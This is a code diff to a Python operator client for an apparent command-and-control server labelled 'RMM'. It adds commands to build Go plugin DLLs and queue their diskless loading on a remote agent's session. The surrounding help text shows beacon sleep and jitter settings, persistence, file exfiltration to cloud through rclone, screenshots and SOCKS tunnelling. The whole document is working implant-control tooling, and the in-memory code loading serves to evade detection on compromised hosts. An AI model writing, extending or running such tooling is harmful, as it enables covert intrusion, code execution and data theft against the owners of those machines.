@@ -59,6 +59,7 @@ RMM_CLI_COMMANDS = [
     "rclone-config",
     "upload",
     "screenshot",
+    "pe",
     "socks",
     "events",
     "exec",
@@ -217,6 +218,22 @@ class RmmApiClient:
             f"/api/v1/sessions/{session_id}/screenshot",
             {},
         )
+
+    def list_plugins(self):
+        return self.request("GET", "/api/v1/plugins")
+
+    def queue_pe_load(self, session_id: str, plugin: str, export: str = "Run", plugin_input: str = ""):
+        return self.request(
+            "POST",
+            f"/api/v1/sessions/{session_id}/pe",
+            {"plugin": plugin, "export": export, "input": plugin_input},
+        )
+
+    def build_plugin(self, name: str, output: str | None = None):
+        body = {"name": name}
+        if output:
+            body["output"] = output
+        return self.request("POST", "/api/v1/plugins/build", body)
 
     def start_socks(self, session_id: str, port: int = 1080, bind_host: str = "127.0.0.1"):
         return self.request(
@@ -618,6 +635,45 @@ def cmd_exfil(client: RmmApiClient, state: dict, args):
     print("Exfil queued — poll events for cloud link or destination path")
 
 
+def cmd_pe_load(client: RmmApiClient, state: dict, args):
+    sid = require_session(state, args.session)
+    code, data = client.queue_pe_load(
+        sid,
+        args.plugin,
+        export=getattr(args, "export", "Run"),
+        plugin_input=getattr(args, "input", ""),
+    )
+    if code != 200:
+        die(f"pe load queue failed ({code}): {data}")
+    print("PE plugin load queued — poll events for plugin output")
+
+
+def cmd_pe_list(client: RmmApiClient, state: dict, args):
+    code, data = client.list_plugins()
+    if code != 200:
+        die(f"plugin list failed ({code}): {data}")
+    plugins = data.get("plugins", []) if isinstance(data, dict) else []
+    targets = data.get("targets", []) if isinstance(data, dict) else []
+    toolchain = data.get("toolchain", {}) if isinstance(data, dict) else {}
+    if not plugins:
+        print("No PE plugins found in the server plugin directory")
+    for plugin in plugins:
+        print(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
+    if targets:
+        print(f"Build targets on server: {', '.join(targets)}")
+    if toolchain and not toolchain.get("cross_compiler"):
+        print(f"Warning: cross compiler {toolchain.get('cross_compiler_name')} is missing on the server — plugin builds unavailable")
+    if toolchain and not toolchain.get("go"):
+        print("Warning: Go toolchain is missing on the server — plugin builds unavailable")
+
+
+def cmd_pe_build(client: RmmApiClient, state: dict, args):
+    code, data = client.build_plugin(args.plugin_name, getattr(args, "output", None))
+    if code != 200:
+        die(f"plugin build failed ({code}): {data}")
+    print(f"Built {data.get('output')} ({data.get('size')} bytes, sha256={data.get('sha256')}) into the server plugin directory")
+
+
 def _print_rclone_config(data: dict) -> None:
     if data.get("load_error"):
         print(f"Profile load error: {data['load_error']}")
@@ -743,6 +799,7 @@ Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
 Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
+Plugins: pe list | pe build <plugin> [output.dll] | pe <plugin> [export] [input]   (diskless PE load on the Go agent)
 Config:   rclone-config   (rclone profiles + binary status on server)
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
 Other:    events [since] | health | help | quit
@@ -1183,6 +1240,47 @@ def run_interactive(
                 else:
                     warn(f"failed ({code})")
                 continue
+            if cmd == "pe":
+                if rest and rest[0].lower() == "list":
+                    code, data = client.list_plugins()
+                    if code != 200:
+                        warn(f"plugin list failed ({code}): {data}")
+                    else:
+                        for plugin in data.get("plugins", []):
+                            say(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
+                        if data.get("targets"):
+                            say(f"Build targets: {', '.join(data['targets'])}")
+                        toolchain = data.get("toolchain", {})
+                        if toolchain and not toolchain.get("cross_compiler"):
+                            warn(f"cross compiler {toolchain.get('cross_compiler_name')} missing on server — plugin builds unavailable")
+                    continue
+                if rest and rest[0].lower() == "build":
+                    if len(rest) < 2:
+                        warn("Usage: pe build <plugin> [output.dll]")
+                        continue
+                    output_name = rest[2] if len(rest) > 2 else None
+                    code, data = client.build_plugin(rest[1], output_name)
+                    if code == 200:
+                        say(f"Built {data.get('output')} ({data.get('size')} bytes, sha256={data.get('sha256')})")
+                    else:
+                        warn(f"plugin build failed ({code}): {data}")
+                    continue
+                if not rest:
+                    warn("Usage: pe <plugin> [export] [input] | pe list | pe build <plugin> [output.dll]")
+                    continue
+                sid = session_or_none(state)
+                if not sid:
+                    warn("No session selected")
+                    continue
+                plugin = rest[0]
+                export = rest[1] if len(rest) > 1 else "Run"
+                plugin_input = " ".join(rest[2:]) if len(rest) > 2 else ""
+                code, data = client.queue_pe_load(sid, plugin, export=export, plugin_input=plugin_input)
+                if code == 200:
+                    say(f"PE plugin load queued: {data.get('queued') if isinstance(data, dict) else plugin}")
+                else:
+                    warn(f"failed ({code}): {data}")
+                continue
             if cmd == "socks":
                 if rest and rest[0].lower() == "list":
                     code, data = client.list_socks()
@@ -1427,6 +1525,25 @@ def build_parser() -> argparse.ArgumentParser:
     sp_exfil.add_argument("--dest", default=None, help="Cloud destination path override")
     sp_exfil.add_argument("--session", "-s", default=None)
     sp_exfil.set_defaults(func=cmd_exfil)
+
+    sp_pe = sub.add_parser("pe", help="PE plugin management for the Go agent")
+    sp_pe_sub = sp_pe.add_subparsers(dest="pe_cmd", required=True)
+    sp_pe_list = sp_pe_sub.add_parser(
+        "list", parents=[shared], help="List PE plugins on the server"
+    )
+    sp_pe_list.set_defaults(func=cmd_pe_list)
+    sp_pe_load = sp_pe_sub.add_parser("load", parents=[shared], help="Queue a PE plugin load on the agent")
+    sp_pe_load.add_argument("plugin")
+    sp_pe_load.add_argument("--export", default="Run", help="Plugin export to call (default Run)")
+    sp_pe_load.add_argument("input", nargs="?", default="", help="Optional input passed to the export")
+    sp_pe_load.add_argument("--session", "-s", default=None)
+    sp_pe_load.set_defaults(func=cmd_pe_load)
+    sp_pe_build = sp_pe_sub.add_parser(
+        "build", parents=[shared], help="Cross-compile a checked-in Go plugin on the server"
+    )
+    sp_pe_build.add_argument("plugin_name", help="Checked-in plugin target (see pe list)")
+    sp_pe_build.add_argument("--output", default=None, help="Output DLL name (default <plugin>.dll)")
+    sp_pe_build.set_defaults(func=cmd_pe_build)
 
     sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and binary status on server")
     sp_rcfg.add_argument("--json", action="store_true", help="JSON output")
